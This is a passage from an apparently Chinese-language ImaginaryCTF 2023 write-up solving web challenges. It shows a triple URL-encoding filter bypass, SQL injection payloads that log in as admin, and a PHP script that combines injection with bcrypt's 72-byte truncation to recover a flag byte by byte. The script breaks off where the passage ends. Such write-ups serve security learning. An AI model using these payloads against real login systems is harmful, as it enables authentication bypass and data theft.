class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>]);<br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">str_contains</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;/&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-title function_ invoke__">str_contains</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;.&quot;</span>)) &#123;<br>    <span class="hljs-variable">$contentType</span> = <span class="hljs-title function_ invoke__">mime_content_type</span>(<span class="hljs-string">&quot;stopHacking.png&quot;</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type: <span class="hljs-subst">$contentType</span>&quot;</span>);<br>    <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-string">&quot;stopHacking.png&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$filePath</span> = <span class="hljs-string">&quot;images/&quot;</span> . <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$filename</span>);<br>    <span class="hljs-variable">$contentType</span> = <span class="hljs-title function_ invoke__">mime_content_type</span>(<span class="hljs-variable">$filePath</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type: <span class="hljs-subst">$contentType</span>&quot;</span>);<br>    <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$filePath</span>);<br>  &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>if (str_contains($filename, &quot;/&quot;) or str_contains($filename, &quot;.&quot;))</code>条件防止任意文件读取，但是注意看$filename是经过参数file进行url解码得到的，PHP在获取GET参数的时候解码一次(获取POST参数时不会)，算上else里解码一次，总共需要进行三次解码，两次解码过后$filename不能含有<code>/</code>和<code>.</code>字符，因此，总共需要经过三次url编码，使得在不破坏url结构的同时能够绕过字符串过滤达到文件读取，那读什么文件呢，看下dockerfile，存在：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">COPY</span><span class="language-bash"> flag.png /</span><br></code></pre></td></tr></table></figure><p><img src="/2023/07/23/imaginary-ctf/image-20230724004055979.png"></p><p>传参：</p><p><img src="/2023/07/23/imaginary-ctf/image-20230724004125580.png"></p><hr><h3 id="blank"><a href="#blank" class="headerlink" title="blank"></a>blank</h3><p>后端最核心部分代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs javascript">...........<br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;login&#x27;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> username = req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span>;<br>  <span class="hljs-keyword">const</span> password = req.<span class="hljs-property">body</span>.<span class="hljs-property">password</span>;<br><br>  db.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;SELECT * FROM users WHERE username = &quot;&#x27;</span> + username + <span class="hljs-string">&#x27;&quot; and password = &quot;&#x27;</span> + password+ <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">err, row</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (err) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err);<br>      res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Error retrieving user&#x27;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">if</span> (row) &#123;<br>        req.<span class="hljs-property">session</span>.<span class="hljs-property">loggedIn</span> = <span class="hljs-literal">true</span>;<br>        req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span> = username;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Login successful!&#x27;</span>);<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        res.<span class="hljs-title function_">status</span>(<span class="hljs-number">401</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Invalid username or password&#x27;</span>);<br>      &#125;<br>    &#125;<br>  &#125;);<br>&#125;);<br>..........<br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span> == <span class="hljs-string">&quot;admin&quot;</span>) &#123;<br>    res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Welcome admin. The flag is &#x27;</span> + fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>));<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (req.<span class="hljs-property">session</span>.<span class="hljs-property">loggedIn</span>) &#123;<br>    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">401</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;You must be admin to get the flag.&#x27;</span>);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">401</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Unauthorized. Please login first.&#x27;</span>);<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p><code>&#39;SELECT * FROM users WHERE username = &quot;&#39;</code>拼接<code>username</code>拼接<code>&#39;&quot; and password = &quot;&#39;</code>拼接<code>password</code>拼接<code>&#39;&quot;&#39;</code>最终username和password均为双引号闭合</p><p>随便一个常规字符输入会显示<code>Invalid username or password</code>，但是传入双引号后出现<code>Error retrieving user</code>报错回显，这里注意，***sqlite3和Oracle不支持#号单行注释，只能使用–***，传入<code>&quot;--</code>，报错消失，再次变为<code>Invalid username or password</code>，探路完成，下面看源代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span> (row) &#123;<br>        req.<span class="hljs-property">session</span>.<span class="hljs-property">loggedIn</span> = <span class="hljs-literal">true</span>;<br>        req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span> = username;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Login successful!&#x27;</span>);<br>      &#125;<br></code></pre></td></tr></table></figure><p>要查询到结果，才能登陆成功，并设置session，没有session直接访问&#x2F;flag会</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">else</span> &#123;<br>    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">401</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Unauthorized. Please login first.&#x27;</span>);<br>  &#125;<br></code></pre></td></tr></table></figure><p>这里就是一个简单的利用select查询字符串，当然我们得让原来的查询语句无查询结果，或者联合查询完后用limit语句，来使得查询结果为一条对吧。</p><p>之后第一个坑来了(个人做题时)，判断原查询结果字段数，别问，问就是上来没<code>order by</code>上来就是<code>union select 1,2</code>，默认只有用户名和密码两个字段了呜呜呜，结果咋地都是报错，卡了有一会，后面头脑发光，转过来了，欸，应该是有第三个字段，试了下<code>&quot; union select 1,2,3--</code>，欸，不出所料</p><p><img src="/2023/07/23/imaginary-ctf/image-20230724010604690.png"></p><p><strong>判断字段数，很重要呜呜呜</strong></p><p>然后捏，当我们满心欢喜拿到session去访问&#x2F;flag时，欸嘿</p><p><img src="/2023/07/23/imaginary-ctf/image-20230724010756515.png"></p><p>好吧扭头回去看源代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span> (row) &#123;<br>        req.<span class="hljs-property">session</span>.<span class="hljs-property">loggedIn</span> = <span class="hljs-literal">true</span>;<br>        req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span> = username;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Login successful!&#x27;</span>);<br>      &#125;<br></code></pre></td></tr></table></figure><p>session的username值是username赋的，username是我们传入的用户名(<code>const username = req.body.username;</code>)，所以就是说，弄了那么久，最后传进来的用户名是那一大坨”payload”，设置的session也是。。。不慌，想让传入的username值为admin，很好满足，别急，别忘了还有一个password注入点。</p><p>这回我们直接传入username为admin，懒得判断原查询结果哪个字段是admin了，索性三个都弄成admin，上payload：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">username:admin<br>password:&quot; union <span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;admin&#x27;</span>--<br></code></pre></td></tr></table></figure><p>之后SQL语句变为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">SELECT * FROM users WHERE username = &quot;admin&quot; and password = &quot;&quot; union select &#x27;admin&#x27;,&#x27;admin&#x27;,&#x27;admin&#x27;--&quot;<br></code></pre></td></tr></table></figure><p>登陆成功后访问&#x2F;flag，拿到flag：</p><p><img src="/2023/07/23/imaginary-ctf/image-20230724011741863.png"></p><hr><h3 id="Perfect-Picture"><a href="#Perfect-Picture" class="headerlink" title="Perfect Picture"></a>Perfect Picture</h3><p>看一眼源代码就是修改图片像素参数</p><hr><h3 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h3><p>当你感觉什么都没有的时候，为什么不按下F12呢？  ————鲁迅</p><p>直接传&#x2F;?source</p><p><img src="/2023/07/23/imaginary-ctf/image-20230724012342239.png"></p><p>源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-variable">$flag</span> = <span class="hljs-variable">$_ENV</span>[<span class="hljs-string">&#x27;FLAG&#x27;</span>] ?? <span class="hljs-string">&#x27;jctf&#123;test_flag&#125;&#x27;</span>;<br><span class="hljs-variable">$magic</span> = <span class="hljs-variable">$_ENV</span>[<span class="hljs-string">&#x27;MAGIC&#x27;</span>] ?? <span class="hljs-string">&#x27;aabbccdd11223344&#x27;</span>;<br><span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SQLite3</span>(<span class="hljs-string">&#x27;/db.sqlite3&#x27;</span>);<br><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] ?? <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>] ?? <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-variable">$magic</span>])) &#123;<br>    <span class="hljs-variable">$password</span> .= <span class="hljs-variable">$flag</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$username</span> &amp;&amp; <span class="hljs-variable">$password</span>) &#123;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">querySingle</span>(<span class="hljs-string">&quot;SELECT username, pwhash FROM users WHERE username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>, <span class="hljs-literal">true</span>);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$res</span>) &#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;Invalid username or password&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">password_verify</span>(<span class="hljs-variable">$password</span>, <span class="hljs-variable">$res</span>[<span class="hljs-string">&#x27;pwhash&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$u</span> = <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$res</span>[<span class="hljs-string">&#x27;username&#x27;</span>]);<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;Welcome <span class="hljs-subst">$u</span>! But there is no flag here :P&quot;</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$res</span>[<span class="hljs-string">&#x27;username&#x27;</span>] === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>            <span class="hljs-variable">$msg</span> .= <span class="hljs-string">&quot;&lt;!-- magic: <span class="hljs-subst">$magic</span> --&gt;&quot;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;Invalid username or password&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>    <br><span class="hljs-comment">#下面html中还嵌着一个&lt;?= $msg ?&gt;</span><br></code></pre></td></tr></table></figure><p><code>??</code>：php8新加入的，如果前面的变量不存在，就将后面的默认字符串赋值，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$flag</span> = <span class="hljs-variable">$_ENV</span>[<span class="hljs-string">&#x27;FLAG&#x27;</span>] ?? <span class="hljs-string">&#x27;jctf&#123;test_flag&#125;&#x27;</span>;<span class="hljs-comment">#如果无法从环境变量中获取到FLAG，那么就把后面的那个赋值给$flag</span><br><span class="hljs-variable">$magic</span> = <span class="hljs-variable">$_ENV</span>[<span class="hljs-string">&#x27;MAGIC&#x27;</span>] ?? <span class="hljs-string">&#x27;aabbccdd11223344&#x27;</span>;<span class="hljs-comment">#同理</span><br><span class="hljs-comment">#主打的就是一个保险（</span><br></code></pre></td></tr></table></figure><p>在学习安全的路上首次亮相<code>password_verify()</code>函数亮相，判断变量$password的hash值是否等于第二个参数(存入数据库当中的经哈希处理后的字符串)，然后还要$res[‘username’]为’admin’，怎么想了想和上一题blank好像很像，至于构造hash字符串编码，php中有对应的<code>password_hash()</code>函数，先随便生成个密码看看</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$input</span> = <span class="hljs-string">&quot;666&quot;</span>;<br><span class="hljs-variable">$hash</span> = <span class="hljs-title function_ invoke__">password_hash</span>(<span class="hljs-variable">$input</span>,PASSWORD_DEFAULT);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$hash</span>;<br><br><span class="hljs-comment">#output:$2y$10$gJWTsCxZTfjNlqN7hVqCF.QKzQ6giNnSpayWxWvG6gnOUTikgJ3Im</span><br></code></pre></td></tr></table></figure><p>嗯。。在这之前我一定测试过字段数，我一定不是随便写两个字段下去的</p><p><img src="/2023/07/23/imaginary-ctf/image-20230724015219040.png"></p><p>总之和上一道题差不多的操作之后，成功让password验证成功，看一眼注释，拿到那个magic：</p><p><img src="/2023/07/23/imaginary-ctf/image-20230724015352137.png"></p><p>回到源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-variable">$magic</span>])) &#123;<br>    <span class="hljs-variable">$password</span> .= <span class="hljs-variable">$flag</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>是的，没错。。是<code>.=</code>我从第一眼就没见到那个点点，这为我之后的懵逼历程埋下了大大的伏笔。。。</p><p>什么意思呢，如果有GET传入$magic，也就是<code>688a35c685a7a654abc80f8e123ad9f0</code>，那么password变量就会与flag拼接起来，这也将是我们之后的突破口。</p><p>然后开始懵逼，最开始没看到那个点点，一度想尝试过爆破逐一比对hash，结果捏，三四十个预选字符，长度大概二十多三十多吧，也就40多的30多次方种情况吧，不多不多（</p><p>然后就求助与学长了，其实当时如果自己去<a href="https://www.php.net/manual/en/function.password-hash.php">php官网</a>有目的性地查找，是能够查询到password_hash的相关特性的</p><p>使用PASSWORD_BCRYPY算法加密，被加密字符串最多长72个字节，这是官方给出的描述</p><p><img src="/2023/07/23/imaginary-ctf/image-20230724020238024.png"></p><p>当时我没去自己查相关特性，求助了L1ao学长，他给了个<a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#password_hash-password_verify"><strong>trick</strong></a>，这个trick讲的其实更加直白，很容易看懂意图所在，但是真的从刚开始就把<code>.=</code>看成 <code>=</code>了呜呜呜呜呜，下面是trick的内容</p><p><img src="/2023/07/23/imaginary-ctf/image-20230724161504043.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$cont</span>=<span class="hljs-number">71</span>; <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">password_verify</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$cont</span>), <span class="hljs-title function_ invoke__">password_hash</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$cont</span>).<span class="hljs-string">&quot;b&quot;</span>, PASSW<br>False<br><br><span class="hljs-variable">$cont</span>=<span class="hljs-number">72</span>; <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">password_verify</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$cont</span>), <span class="hljs-title function_ invoke__">password_hash</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$cont</span>).<span class="hljs-string">&quot;b&quot;</span>, PASSW<br>True<br></code></pre></td></tr></table></figure><p>PASSWORD_BCRYPT加密的时候只对前72个字节加密，超过72字节的部分不管，根据这个我们可以得出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$cont</span>=<span class="hljs-number">71</span>; <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">password_verify</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$cont</span>), <span class="hljs-title function_ invoke__">password_hash</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$cont</span>).<span class="hljs-string">&quot;b&quot;</span>, PASSWORD_BCRYPT)<br>//False<br><span class="hljs-variable">$cont</span>=<span class="hljs-number">72</span>; <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">password_verify</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$cont</span>), <span class="hljs-title function_ invoke__">password_hash</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$cont</span>).<span class="hljs-string">&quot;b&quot;</span>, PASSWORD_BCRYPT)<br>//True<br><span class="hljs-variable">$cont</span>=<span class="hljs-number">71</span>; <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">password_verify</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$cont</span>).<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$password</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>), <span class="hljs-title function_ invoke__">password_hash</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$cont</span>).<span class="hljs-string">&quot;b&quot;</span>, PASSWORD_BCRYPT).<span class="hljs-string">&#x27;i&#x27;</span><br>//True<br><span class="hljs-variable">$cont</span>=<span class="hljs-number">70</span>; <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">password_verify</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$cont</span>).<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$password</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>), <span class="hljs-title function_ invoke__">password_hash</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$cont</span>).<span class="hljs-string">&quot;b&quot;</span>, PASSWORD_BCRYPT).<span class="hljs-string">&#x27;ic&#x27;</span><br>//True<br><span class="hljs-variable">$cont</span>=<span class="hljs-number">69</span>; <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">password_verify</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$cont</span>).<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$password</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>), <span class="hljs-title function_ invoke__">password_hash</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$cont</span>).<span class="hljs-string">&quot;b&quot;</span>, PASSWORD_BCRYPT).<span class="hljs-string">&#x27;ict&#x27;</span><br>//True<br>........                               <br></code></pre></td></tr></table></figure><p>由于是传入<code>$magic</code>之后<code>$password</code>是拼接在用户传入的部分后面的，(这里我们暂称重复的71个’a’为冗余字节)所以可以从71一个一个减少用户传入的冗余字节数，每次减少一个字节数之后，遍历候选字符集，拼接在冗余字节<strong>和已知password部分</strong>后面(不要每次都只拼接在冗余字节后面，要爆出来一个就紧跟在a后面)</p><p>最开始的时候不知道为啥闲着没事就用php而不是python写了一个脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$url</span> = <span class="hljs-string">&#x27;http://login.chal.imaginaryctf.org/?688a35c685a7a654abc80f8e123ad9f0&#x27;</span>;<br><span class="hljs-variable">$pre</span> = <span class="hljs-string">&quot;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!?&#123;&#125;_&quot;</span>;<br><span class="hljs-variable">$arr</span> = <span class="hljs-title function_ invoke__">str_split</span>(<span class="hljs-variable">$pre</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$re</span> = <span class="hljs-number">71</span>;<span class="hljs-variable">$re</span> &gt; <span class="hljs-number">0</span>;<span class="hljs-variable">$re</span>--)&#123;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$arr</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$i</span>)&#123;<br>        <span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$re</span>);<br>        <span class="hljs-variable">$password</span> =  <span class="hljs-title function_ invoke__">password_hash</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$re</span>).<span class="hljs-variable">$flag</span>.<span class="hljs-variable">$i</span>, PASSWORD_BCRYPT);<br>        <span class="hljs-variable">$post</span> = <span class="hljs-keyword">array</span>(<br>            <span class="hljs-string">&#x27;password&#x27;</span> =&gt; <span class="hljs-variable">$username</span>,<br>            <span class="hljs-string">&#x27;username&#x27;</span> =&gt; <span class="hljs-string">&#x27;\&#x27; union select \&#x27;admin\&#x27;,\&#x27;&#x27;</span>.<span class="hljs-variable">$password</span>.<span class="hljs-string">&#x27;\&#x27;--&#x27;</span><br>        );<br>        <span class="hljs-comment">#echo $post[&#x27;username&#x27;];</span><br>        <span class="hljs-variable">$post</span> = <span class="hljs-title function_ invoke__">http_build_query</span>(<span class="hljs-variable">$post</span>);<br>        <span class="hljs-variable">$curl</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>); <br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_POST, <span class="hljs-number">1</span>); <br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_POSTFIELDS, <span class="hljs-variable">$post</span>); <br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-literal">true</span>); <br>        <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$curl</span>);<br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$curl</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$res</span>,<span class="hljs-string">&#x27;Welcome&#x27;</span>))&#123;<br>            <span class="hljs-variable">$flag</span> .= <span class="hljs-variable">$i</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br>            <span 